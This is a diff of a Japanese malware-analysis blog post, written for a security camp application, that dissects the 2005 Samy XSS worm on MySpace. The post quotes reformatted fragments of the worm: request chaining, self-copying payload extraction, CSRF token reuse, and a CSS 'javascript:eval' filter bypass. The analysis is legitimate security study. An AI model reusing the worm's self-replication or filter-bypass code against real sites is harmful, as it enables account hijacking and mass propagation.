@@ -1,35 +1,44 @@
+---
+description: 'Mar 1, 2018'
+---
+
 # XSSワーム「Samy」の動作を解析する
 
 このエントリーはセキュリティ・キャンプWS「The Anatomy of Malware 完全版」の応募課題として提出したものである。公開にあたり一部文章の修正と図式の差し替えをおこなった。
 
 ## Samyの誕生とそれによる被害
 
-アメリカのハッカーであるSamy Kamkar氏（[@samykamkar](https://twitter.com/samykamkar)）が2005年にリリースしたMySpaceを標的とするXSSワームが「Samy（JS.Spacehero）」である。当時のソーシャル・ネットワーキング・サービスMySpaceではプロフィールをユーザー好みのスタイルに設定できる仕様であり、一部のHTMLタグの使用が許可されていた。JavaScriptの実行につながるタグや属性などの使用は禁止されていたが、Kamkar氏はそのフィルター処理を回避できた<sup id="f1">[1](#fn1)</sup>。当時19歳だったKamkar氏はこの抜け道を利用して友達を増やすためにSamyを開発した。
+アメリカのハッカーであるSamy Kamkar氏（[@samykamkar](https://twitter.com/samykamkar)）が2005年にリリースしたMySpaceを標的とするXSSワームが「Samy（JS.Spacehero）」である。当時のソーシャル・ネットワーキング・サービスMySpaceではプロフィールをユーザー好みのスタイルに設定できる仕様であり、一部のHTMLタグの使用が許可されていた。JavaScriptの実行につながるタグや属性などの使用は禁止されていたが、Kamkar氏はそのフィルター処理を回避できた¹。当時19歳だったKamkar氏はこの抜け道を利用して友達を増やすためにSamyを開発した。
 
-2005年10月4日にKamkar氏のプロフィールで公開されたSamyは、わずか20時間で100万人以上のMySpaceユーザーに感染した。このワームは最も急速に感染を広げたマルウェアと考えられており、XSSワームの起源にして頂点と言えるだろう。感染したユーザーはKamkar氏のアカウントへのフレンド申請を強制され、プロフィールのヒーロー欄に ` but most of all, samy is my hero.` との文言とペイロード（Samy自身）を書き込まれる。情報資産の窃取や金銭の要求などの悪質な行為はおこなわれなかった。
+2005年10月4日にKamkar氏のプロフィールで公開されたSamyは、わずか20時間で100万人以上のMySpaceユーザーに感染した。このワームは最も急速に感染を広げたマルウェアと考えられており、XSSワームの起源にして頂点と言えるだろう。感染したユーザーはKamkar氏のアカウントへのフレンド申請を強制され、プロフィールのヒーロー欄に `but most of all, samy is my hero.` との文言とペイロード（Samy自身）を書き込まれる。情報資産の窃取や金銭の要求などの悪質な行為はおこなわれなかった。
 
 ## Samyの感染動作
 
 今回は[Kamkar氏のサイト](https://samy.pl/popular/tech.html)に残されている[Samyのコード](https://gist.github.com/atsunoda/efe6970e522b6af9c0cdecea0fa251bf#file-samy)を整形し、[変数名を付与したコード](https://gist.github.com/atsunoda/efe6970e522b6af9c0cdecea0fa251bf#file-samy-js)を引用しながら感染動作を解析する。コードフローを図に示すと以下のようになる。
 
-<p align="center"><img src="/assets/2018/analyzing_samy_xss_worm/samy's_activity.png" alt="samy's_activity"></p>
+![](../.gitbook/assets/samys_activity.png)
 
 MySpaceのプロフィールは `profile.myspace.com` と `www.myspace.com` の両方のドメインから閲覧できた。しかし編集は後者からしかおこなえなかったため、最初にサブドメインを確認している。感染動作に利用するページとそのURLは以下である。
 
 * プロフィールページ  
-  hxxp://www[.]myspace.com/index.cfm?fuseaction=user.viewProfile
+
+  hxxp://www\[.\]myspace.com/index.cfm?fuseaction=user.viewProfile
+
 * プロフィール編集確認ページ  
-  hxxp://www[.]myspace.com/index.cfm?fuseaction=profile.previewInterests
+
+  hxxp://www\[.\]myspace.com/index.cfm?fuseaction=profile.previewInterests
+
 * プロフィール編集完了ページ  
-  hxxp://www[.]myspace.com/index.cfm?fuseaction=profile.processInterests
+
+  hxxp://www\[.\]myspace.com/index.cfm?fuseaction=profile.processInterests
 
 コードフローと各ページのURLを把握した上で `main()` から読み解いていく。
 
-### main()の動作
+### main\(\)の動作
 
 このコードが存在する（感染済みの）プロフィールページを閲覧した被害者のIDを `getClientFID()` で取得する。その後 `httpSend()` でペイロードの書き込みを、 `httpSend2()` でフレンド申請をおこなう。今回は感染動作に注目するため `httpSend()` の処理を追う。
 
-```js
+```javascript
 function main() {
   var AN_clientFID = getClientFID();
   var BH_uri = '/index.cfm?fuseaction=user.viewProfile&friendID=' + AN_clientFID + '&Mytoken=' + L_myToken;
@@ -40,13 +49,13 @@ function main() {
 }
 ```
 
-### httpSend()の動作
+### httpSend\(\)の動作
 
 感染動作に利用するページへの通信は全てこの関数からおこなわれる。`onreadystatechange` イベントから実行される `getHome()` でプロフィール編集確認ページとの通信を、`postHero()` でプロフィール編集完了ページとの通信をおこなう。
 
 まず被害者のプロフィールページをGETする。通信状態（readyState）が変わるたびにイベントが発生し、通信が終了すると `getHome()` の処理に進む。
 
-```js
+```javascript
 function httpSend(BH_uri, BI_function, BJ_method, BK_contents) {
   if (!J_xmlhttp1) {
     return false
@@ -62,11 +71,11 @@ function httpSend(BH_uri, BI_function, BJ_method, BK_contents) {
 }
 ```
 
-### getHome()の動作
+### getHome\(\)の動作
 
 GETしたプロフィールページのレスポンスを解析し、ヒーロー欄に `samy` の文字が含まれているか確認する。含まれている場合は既に感染済みと判断し、感染動作は終了する。含まれていない場合はペイロードを搭載したリクエストを組み立て、プロフィール編集確認ページにPOSTする。その通信が終了すると `postHero()` の処理に進む。
 
-```js
+```javascript
 function getHome() {
   if (J_xmlhttp1.readyState != 4) {
     return
@@ -89,11 +98,11 @@ function getHome() {
 }
 ```
 
-### AF_payloadの生成
+### AF\_payloadの生成
 
 ペイロードを生成する処理は以下である。このコードが存在するページのHTMLを取得し、そこからペイロードに再利用する文字列を抽出する。この処理でSamy自身を複製している。
 
-```js
+```javascript
 var AA_selfHTML = g_getSelfHTML();
 var AB_indexHeadOfSelfPayload = AA_selfHTML.indexOf('m' + 'ycode');
 var AC_string = AA_selfHTML.substring(AB_indexHeadOfSelfPayload, AB_indexHeadOfSelfPayload + 4096);  // Length of unformatted self code is 4015.
@@ -108,7 +117,7 @@ if (AE_selfPayload) {
 var AG_heroes;
 ```
 
-抽出した文字列の二箇所に `'` を追加する処理がある。IE6のDOMから `createTextRange()` や `innerHTML` によって生成されたHTMLでは、Style属性値内の引用符が削除されることから、もとの状態に戻すための処理だと考える<sup id="f2">[2](#fn2)</sup>。これによりCSS構文は以下のように修正される。
+抽出した文字列の二箇所に `'` を追加する処理がある。IE6のDOMから `createTextRange()` や `innerHTML` によって生成されたHTMLでは、Style属性値内の引用符が削除されることから、もとの状態に戻すための処理だと考える²。これによりCSS構文は以下のように修正される。
 
 ```diff
 -BACKGROUND: url(java 
@@ -117,11 +126,11 @@ var AG_heroes;
 +script:eval(document.all.mycode.expr)')
 ```
 
-### postHero()の動作
+### postHero\(\)の動作
 
 最後にペイロードを搭載したリクエストをプロフィール編集完了ページにPOSTする。リクエストには確認ページから抽出したCSRF対策トークン `hash` も含めている。
 
-```js
+```javascript
 function postHero() {
   if (J_xmlhttp1.readyState != 4) {
     return
@@ -147,7 +156,8 @@ Samyの終息後も[Twitter](https://www.mcafee.com/japan/security/virT.asp?v=JS
 
 今回の解析ではコードの整形と可視化のためにVisual Studioを、JavaScriptのデバッグのためにIE6とFirefoxを、HTTP通信の取得のためにBurp Suiteを使用した。Samyのコードは圧縮処理を除いて難読化は施されていなかった。しかしXSSワームを含む現代のJavaScriptマルウェアは高度な難読化が施されているため、[JSDetox](http://relentless-coding.org/projects/jsdetox/)などを使用したJavaScriptの解析技術が求められる。難読化されたJavaScriptマルウェアの解析方法も機会があれば調査してまとめたい。
 
----
 
-<sup id="fn1">[1](#f1)</sup> 当時のIEとSafariのみで解釈される特殊なCSS構文を使用することで、フィルター処理を回避してJavaScriptを実行した。この詳細は[Kamkar氏のサイト](https://samy.pl/popular/tech.html)やOWASP & WASC AppSec 2007の「[The MySpace Worm](https://www.owasp.org/images/7/79/OWASP-WASCAppSec2007SanJose_SamyWorm.ppt)」で解説されている。  
-<sup id="fn2">[2](#f2)</sup> IE6では `url()` への引数を引用符で括らなくても正常に動作したことから、IE5以前への対処だと考える。[Kamkar氏へのインタビュー](http://blogoscoped.com/archive/2005-10-14-n81.html)のなかで「私のSafariでは動かなかったが、驚くことに古いバージョンを使っていた彼女は感染した」と語っているように、Kamkar氏はSafariユーザーを標的として考えていなかった。  
+
+¹ 当時のIEとSafariのみで解釈される特殊なCSS構文を使用することで、フィルター処理を回避してJavaScriptを実行した。この詳細は[Kamkar氏のサイト](https://samy.pl/popular/tech.html)やOWASP & WASC AppSec 2007の「[The MySpace Worm](https://www.owasp.org/images/7/79/OWASP-WASCAppSec2007SanJose_SamyWorm.ppt)」で解説されている。  
+² IE6では `url()` への引数を引用符で括らなくても正常に動作したことから、IE5以前への対処だと考える。[Kamkar氏へのインタビュー](http://blogoscoped.com/archive/2005-10-14-n81.html)のなかで「私のSafariでは動かなかったが、驚くことに古いバージョンを使っていた彼女は感染した」と語っているように、Kamkar氏はSafariユーザーを標的として考えていなかった。
+
